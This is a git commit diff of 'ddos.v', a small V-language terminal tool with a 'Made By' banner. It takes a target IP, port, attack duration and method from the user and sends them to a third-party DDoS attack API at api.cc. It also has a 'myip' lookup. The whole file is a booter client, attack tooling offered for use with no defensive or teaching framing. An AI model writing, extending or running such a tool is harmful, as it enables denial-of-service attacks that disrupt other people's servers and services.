eff7e2b60d799c64015d8850d6513ac7c396c78a
Sokisa <111327650+Sokisa@users.noreply.github.com>
2023-01-04 08:19:48 +0100

    Updated
    everything should woork but im not sure about the api.cc requests  i have looked at the other parts!

--- ddos.v
+++ ddos.v
@@ -2,26 +2,27 @@ import net.http
 import os
 
 fn main() {
-  mut method := '\x1b[95m ╔═════════════════\e[37m═════════════════╗  \x1b[95m\r\n'
-      method += '\x1b[95m ║        PUT YOUR MET\e[37mHODS HERE     ║  \x1b[95m\r\n'
-	  method += '\x1b[95m ╚═════════════════\e[37m═════════════════╝  \x1b[95m\r\n'
-      for ;; {
-      input := os.input('\x1b[0;35m╔═[\x1b[32mawfulಠಠTool\x1b[0;35m]═\x1b[32m$
-\x1b[0;35m╚══\x1b[32m>\x1b[1;37m')
-      if input == "attack"{
-      mut methods := os.input('Enter a method: ')
-      mut ip := os.input('Enter a ip: ')
-      mut port := os.input('Enter a port: ')
-      mut time := os.input('Enter a time: ')
-      http.get_text('https://api.cc/api.php?&ip=' + ip + '&port=' + port + '&time=' + time + '&method=' + methods)
-}
-      if input == "myip"{
-          wws := http.get_text('https://api.my-ip.io/ip')
-      mut myip := '\x1b[95m ╔══════════════════════════════════╗  \r\n'
-          myip += '\x1b[95m ║\x1b[96m Your ip is [\x1b[31m$wws\x1b[95m\x1b[96m]\x1b[95m         ║  \r\n'
-          myip += '\x1b[95m ╚══════════════════════════════════╝\r\n'
-          myip += '\x1b[37m\r\n'
-          println(myip)
+    mut prnt := '\x1b[95m ╔═════════════════\e[37m═════════════════╗  \x1b[95m\r\n'
+    prnt += '\x1b[95m ║        PUT YOUR MET\e[37mHODS HERE     ║  \x1b[95m\r\n'
+	prnt += '\x1b[95m ╚═════════════════\e[37m═════════════════╝  \x1b[95m\r\n'
+    for ;; {
+        println(prnt)
+        println('\x1b[0;35m╔═[\x1b[32m{Made By @jazuki1337} \x1b[0;35m]═\x1b[32m$\x1b[0;35m╚══\x1b[32m>\x1b[1;37m')
+
+        methods := os.input('Enter Method: ')
+        if methods == "attack"{
+        mut ip := os.input('Enter a ip: ')
+        mut port := os.input('Enter a port: ')
+        mut time := os.input('Enter a time: ')
+        http.get_text('https://api.cc/api.php?&ip=' + ip + '&port=' + port + '&time=' + time + '&method=' + methods)
+    }
+    if methods == "myip"{
+        wws := http.get_text('https://api.my-ip.io/ip')
+    mut myip := '\x1b[95m ╔══════════════════════════════════╗  \r\n'
+    myip += '\x1b[95m ║\x1b[96m Your ip is [\x1b[31m$wws\x1b[95m\x1b[96m]\x1b[95m     ║  \r\n'
+    myip += '\x1b[95m ╚══════════════════════════════════╝\r\n'
+    myip += '\x1b[37m\r\n'
+    println(myip)
   }
  }
-} 
+}
